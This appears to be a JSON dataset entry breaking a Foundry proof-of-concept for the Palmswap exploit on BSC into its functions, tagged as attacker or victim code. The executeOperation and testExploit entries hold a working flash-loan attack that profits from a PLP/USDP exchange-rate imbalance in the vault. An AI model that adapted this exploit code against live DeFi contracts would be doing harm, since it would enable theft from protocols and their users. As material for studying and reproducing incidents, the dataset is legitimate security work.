[
  {
    "contract/interface": "PalmswapTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "PalmswapTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PalmswapTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PalmswapTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PalmswapTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool) {\n        // Add liquidity. Exchange rate between USDP and PLP is 1:1\n        uint256 amountOut = LiquidityEvent.purchasePlp(1_000_000 * 1e18, 0, 0);\n\n        BUSDT.transfer(address(Vault), 2_000_000 * 1e18);\n        Vault.buyUSDP(address(this));\n        // Remove liquidity. Exchange rate between USDP and PLP is 1:1.9.\n        // Attacker is able to exchange for 1.9 times more USDP\n        uint256 amountUSDP = LiquidityEvent.unstakeAndRedeemPlp(amountOut - 13_294 * 1e15, 0, address(this));\n\n        USDP.transfer(address(Vault), amountUSDP - 3154 * 1e18);\n        Vault.sellUSDP(address(this));\n\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PalmswapTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "PalmswapTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 30_248_637);\n        cheats.label(address(BUSDT), \"BUSDT\");\n        cheats.label(address(PLP), \"PLP\");\n        cheats.label(address(USDP), \"USDP\");\n        cheats.label(address(Vault), \"Vault\");\n        cheats.label(address(LiquidityEvent), \"LiquidityEvent\");\n        cheats.label(address(RadiantLP), \"RadiantLP\");\n        cheats.label(plpManager, \"plpManager\");\n        cheats.label(fPLP, \"fPLP\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PalmswapTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PalmswapTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PalmswapTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PalmswapTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "PalmswapTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PalmswapTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PalmswapTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(BUSDT), address(this), 0);\n        BUSDT.approve(plpManager, type(uint256).max);\n        BUSDT.approve(address(RadiantLP), type(uint256).max);\n        PLP.approve(fPLP, type(uint256).max);\n\n        emit log_named_decimal_uint(\n            \"Attacker balance of BUSDT before exploit\", BUSDT.balanceOf(address(this)), BUSDT.decimals()\n        );\n\n        takeFlashLoanOnRadiant();\n\n        emit log_named_decimal_uint(\n            \"Attacker balance of BUSDT after exploit\", BUSDT.balanceOf(address(this)), BUSDT.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IVault",
    "source_type": "victim_contract",
    "function_name": "buyUSDP",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IVault",
    "source_type": "victim_contract",
    "function_name": "sellUSDP",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILiquidityEvent",
    "source_type": "victim_contract",
    "function_name": "purchasePlp",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILiquidityEvent",
    "source_type": "victim_contract",
    "function_name": "unstakeAndRedeemPlp",
    "original_code": "",
    "description": ""
  }
]